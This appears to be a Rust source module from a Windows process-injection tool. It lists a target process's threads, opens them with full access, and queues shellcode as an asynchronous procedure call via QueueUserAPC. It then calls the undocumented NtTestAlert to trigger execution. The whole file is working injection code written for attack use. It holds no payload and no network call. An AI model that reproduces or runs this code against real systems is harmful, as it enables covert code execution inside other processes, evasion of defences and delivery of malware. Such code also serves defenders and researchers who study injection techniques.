//! Representation for a single thread.
#![allow(dead_code)]

use crate::{
    helper::module::resolve_nt_test_alert,
    wrapper::{
        args::ProcessArgs,
        process::RemoteProcess
    }
};
use log::info;
use std::{
    mem::{ size_of, transmute },
    ops::{Deref, DerefMut}
};
use windows::Win32::{
    Foundation::{
        CloseHandle,
        GetLastError,
        HANDLE,
        PAPCFUNC
    },
    System::{
        Diagnostics::ToolHelp::{ 
            CreateToolhelp32Snapshot,
            Thread32First, Thread32Next,
            TH32CS_SNAPTHREAD, THREADENTRY32
        },
        Threading::{
            OpenThread,
            THREAD_ALL_ACCESS,
            QueueUserAPC
        }
    }
};

// Vector of individual thread instances.
// Exposes management methods conducive to thread
// management.
pub struct RemoteThreadCollection(Vec<RemoteThread>);

impl RemoteThreadCollection {

    fn new() -> Self {

        RemoteThreadCollection(Vec::new())
    }

    fn push(&mut self, t_entry: RemoteThread) -> Result<(), ()> {
        // LIFO pushing single thread onto vector of threads.

        self.0.push(t_entry);

        Ok(())
    }

    fn pop(&mut self) -> Option<RemoteThread> {
        // LIFO retrieval of a given thread.
        // Mutates the internal list.
 
        self.0.pop()
    }

    fn len(&self) -> usize {
        // Returns length of internal vector.
        // Used for debug logging.

        self.0.len()
    }

    pub fn enumerate_threads(&mut self, p_id: u32) -> Result<(), &str> {
        // Creates collection of threads belonging to specified
        // parent process.

        let t_snapshot = unsafe {

            CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
        };

        if t_snapshot.is_err() { return Err("Failed to create snapshot for target process."); }

        let mut thread_entry = THREADENTRY32 {

            dwSize: size_of::<THREADENTRY32>() as u32,

            // Populate other members with default values.
            ..Default::default()
        };

        if unsafe { Thread32First(t_snapshot.clone().unwrap(), &mut thread_entry) }.is_ok() {

            // Enumerate each THREADENTRY32 in process.
            while unsafe {

                Thread32Next(t_snapshot.clone().unwrap(), &mut thread_entry) 

            }.is_ok() {

                // If thread is part of target process,
                // push onto collection. Casts to self-created non-complex
                // implementation.
                if thread_entry.th32OwnerProcessID == p_id { 

                    let _ = self.push(RemoteThread::from(thread_entry));
                }
            }

            let _ = unsafe { CloseHandle(t_snapshot.unwrap()) };

        } else { return Err("No threads to enumerate on target process."); }

        Ok(())
    }
}

// Permits easily iterating over threads within
// collection without internally, directly referencing
// vector of threads.
impl Deref for RemoteThreadCollection {

    type Target = Vec<RemoteThread>;

    fn deref(&self) -> &Self::Target {
        
        &self.0
    }
}

// Mutable equivalent of Deref, needed as
impl DerefMut for RemoteThreadCollection {

    fn deref_mut(&mut self) -> &mut Self::Target {
        
        &mut self.0
    }
}

// Maps to THREADENTRY32.
// Enables management of an individual thread.
pub struct RemoteThread {

    // Identifier for a single thread, mapping
    // to th32TheadID.
    pub t_id: u32,

    // Handle to the thread, populated
    // later on.
    pub t_handle: Option<HANDLE>
}

impl RemoteThread {

    fn new(t_id: u32) -> Self {

        RemoteThread { t_id, t_handle: None }
    }

    pub fn create_handle(&mut self) -> Result<(), String> {
        // Opens handle to specific thread using
        // API and ID.

        self.t_handle = unsafe {

            // RW access, potentially warranted for the time
            // being when the queueing is implemented.
            OpenThread(THREAD_ALL_ACCESS, true, self.t_id)

        }.ok();

        if self.t_handle.is_none() {
            
            return Err(String::from(
                format!("Handle creation to thread failed: {:?}", unsafe { GetLastError() })
            ));            
        }

        info!("Handle created to thread with ID {}", self.t_id);

        Ok(())
    }

    pub fn queue_apc_routine(&self, p_repr: &mut RemoteProcess) -> Result<(), String> {
        // Push shellcode (as APC) onto a single thread's queue.
        // Intention is for shellcode to be pushed onto queue of each enumerated
        // thread.

        if let (Some(t_handle), Some(p_target_address))
            = (self.t_handle, p_repr.p_target_address) {

            let apc_routine: PAPCFUNC = unsafe { transmute(p_target_address) };

            // Zero DWORD results are interpreted as erroneous.
            if unsafe { QueueUserAPC(apc_routine, t_handle, 0) } == 0 {

                return Err(format!("Failed to queue APC: {:?}", unsafe { GetLastError() }));
            }

            info!("Created APC for shellcode and queued.");

            // Induce alertible state using undocumented NT function.
            if let Some(f_ptr)
                = resolve_nt_test_alert("ntdll\0", "NtTestAlert\0") {

                    let _ = unsafe { f_ptr() };
            }

            Ok(())

        } else {

            Err(String::from("Cannot queue APC for non-existent thread, or with non-existent function."))
        }
    }
}

// Releasing of resources to HANDLE
// attribute.
impl Drop for RemoteThread {

    fn drop(&mut self) {

        if let Some(t_handle) = self.t_handle {

            let _ = unsafe { CloseHandle(t_handle) };
            self.t_handle = None;
        }
    }
}

// Provides interoperability between in-built
// thread structure and that custom.
impl From<THREADENTRY32> for RemoteThread {

    fn from(t_entry: THREADENTRY32) -> Self {
        // Casting from THREADENTRY32 -> RemoteThread.
        
        RemoteThread { t_id: t_entry.th32ThreadID, t_handle: None }
    }
}

pub fn enumerate_threads(p_repr: &mut RemoteProcess) -> Result<RemoteThreadCollection, String> {
    // Friendly API for attaining list of threads in
    // provided process, returning a custom iterable collection.

    let mut thread_collection = RemoteThreadCollection::new();

    // Destructure PID such that this can be used as a needle for the
    // thread enumeration.
    if let ProcessArgs::PID(p_id) = p_repr.identifier {

        if let Err(err) = thread_collection.enumerate_threads(p_id) {

            return Err(String::from(err));
        }

        info!(
            "Found {} threads in target process. Enumerating...",
            thread_collection.len()
        );
    }

    Ok(thread_collection)
}